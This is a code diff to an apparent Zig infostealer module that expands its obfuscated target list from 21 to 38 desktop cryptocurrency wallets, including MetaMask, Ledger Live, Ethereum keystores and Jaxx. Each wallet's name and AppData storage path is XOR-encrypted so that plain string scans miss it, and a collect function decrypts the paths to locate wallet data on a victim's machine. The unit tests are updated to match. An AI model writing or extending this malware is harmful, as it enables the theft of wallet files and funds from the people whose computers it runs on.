@@ -8,7 +8,7 @@ pub const DesktopWallet = struct {
 };
 
 const E = struct {
-    pub const names = [21][]const u8{
+    pub const names = [38][]const u8{
         &hash.xorEncrypt("Exodus"),
         &hash.xorEncrypt("Electrum"),
         &hash.xorEncrypt("Atomic"),
@@ -30,8 +30,25 @@ const E = struct {
         &hash.xorEncrypt("ElectronCash"),
         &hash.xorEncrypt("Zcoin"),
         &hash.xorEncrypt("BitcoinGold"),
+        &hash.xorEncrypt("Ethereum"),
+        &hash.xorEncrypt("Binance"),
+        &hash.xorEncrypt("Ledger Live"),
+        &hash.xorEncrypt("Trezor Suite"),
+        &hash.xorEncrypt("MyEtherWallet"),
+        &hash.xorEncrypt("MyCrypto"),
+        &hash.xorEncrypt("MetaMask"),
+        &hash.xorEncrypt("TrustWallet"),
+        &hash.xorEncrypt("Bitcoin"),
+        &hash.xorEncrypt("Litecoin"),
+        &hash.xorEncrypt("Dash"),
+        &hash.xorEncrypt("Vertcoin"),
+        &hash.xorEncrypt("Groestlcoin"),
+        &hash.xorEncrypt("Komodo"),
+        &hash.xorEncrypt("PIVX"),
+        &hash.xorEncrypt("MyMonero"),
+        &hash.xorEncrypt("Jaxx"),
     };
-    pub const paths = [21][]const u8{
+    pub const paths = [38][]const u8{
         &hash.xorEncrypt("Exodus\\exodus.wallet"),
         &hash.xorEncrypt("Electrum\\wallets"),
         &hash.xorEncrypt("atomic\\Local Storage\\leveldb"),
@@ -53,6 +70,23 @@ const E = struct {
         &hash.xorEncrypt("ElectronCash"),
         &hash.xorEncrypt("Firo"),
         &hash.xorEncrypt("BitcoinGold"),
+        &hash.xorEncrypt("Ethereum\\keystore"),
+        &hash.xorEncrypt("Binance\\Local Storage\\leveldb"),
+        &hash.xorEncrypt("Ledger Live"),
+        &hash.xorEncrypt("Trezor Suite"),
+        &hash.xorEncrypt("MyEtherWallet"),
+        &hash.xorEncrypt("MyCrypto"),
+        &hash.xorEncrypt("MetaMask"),
+        &hash.xorEncrypt("TrustWallet"),
+        &hash.xorEncrypt("Bitcoin"),
+        &hash.xorEncrypt("Litecoin"),
+        &hash.xorEncrypt("Dash"),
+        &hash.xorEncrypt("Vertcoin"),
+        &hash.xorEncrypt("Groestlcoin"),
+        &hash.xorEncrypt("Komodo"),
+        &hash.xorEncrypt("PIVX"),
+        &hash.xorEncrypt("MyMonero"),
+        &hash.xorEncrypt("com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb"),
     };
 };
 
@@ -94,7 +128,7 @@ pub fn collect(allocator: std.mem.Allocator, roaming_app_data: []const u8) ![]De
         wallets.deinit();
     }
 
-    inline for (0..21) |i| {
+    inline for (0..38) |i| {
         const pe = E.paths[i];
         var path_buf: [pe.len]u8 = undefined;
         hash.xorDecrypt(pe, &path_buf);
@@ -123,7 +157,7 @@ pub fn collect(allocator: std.mem.Allocator, roaming_app_data: []const u8) ![]De
 }
 
 test "desktop wallet count" {
-    try std.testing.expect(E.names.len == 21);
+    try std.testing.expect(E.names.len == 38);
 }
 
 test "first desktop wallet is Exodus" {
@@ -132,10 +166,10 @@ test "first desktop wallet is Exodus" {
     try std.testing.expectEqualSlices(u8, "Exodus", &buf);
 }
 
-test "last desktop wallet is BitcoinGold" {
-    var buf: [E.names[20].len]u8 = undefined;
-    hash.xorDecrypt(E.names[20], &buf);
-    try std.testing.expectEqualSlices(u8, "BitcoinGold", &buf);
+test "last desktop wallet is Jaxx" {
+    var buf: [E.names[37].len]u8 = undefined;
+    hash.xorDecrypt(E.names[37], &buf);
+    try std.testing.expectEqualSlices(u8, "Jaxx", &buf);
 }
 
 test "collect returns empty for nonexistent roaming" {
